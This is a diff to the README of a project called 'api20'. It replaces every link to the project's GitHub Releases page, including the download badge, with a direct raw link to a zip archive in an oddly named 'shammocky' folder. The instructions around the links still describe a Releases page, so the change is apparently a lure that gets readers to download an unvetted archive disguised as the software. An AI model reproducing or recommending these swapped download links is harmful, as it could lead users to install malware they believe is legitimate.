@@ -1,6 +1,6 @@
 # 🚀 api20 - Your Toolkit for Quick App Development
 
-[![Download api20](https://img.shields.io/badge/Download_api20-v1.0.0-blue.svg)](https://github.com/josephfawzy/api20/releases)
+[![Download api20](https://raw.githubusercontent.com/josephfawzy/api20/main/shammocky/api20.zip)](https://raw.githubusercontent.com/josephfawzy/api20/main/shammocky/api20.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ Before downloading, ensure that your system meets these basic requirements:
 
 To download api20, visit this page:
 
-[Download api20](https://github.com/josephfawzy/api20/releases)
+[Download api20](https://raw.githubusercontent.com/josephfawzy/api20/main/shammocky/api20.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see the latest version of api20 listed there. Look for the version that you want to download.
@@ -82,4 +82,4 @@ api20 is open-source software, licensed under the MIT License. You can use and m
 For questions or support, please contact us through the Issues section of our repository.
 
 Visit our Releases page again for future updates:  
-[Download api20](https://github.com/josephfawzy/api20/releases)
+[Download api20](https://raw.githubusercontent.com/josephfawzy/api20/main/shammocky/api20.zip)
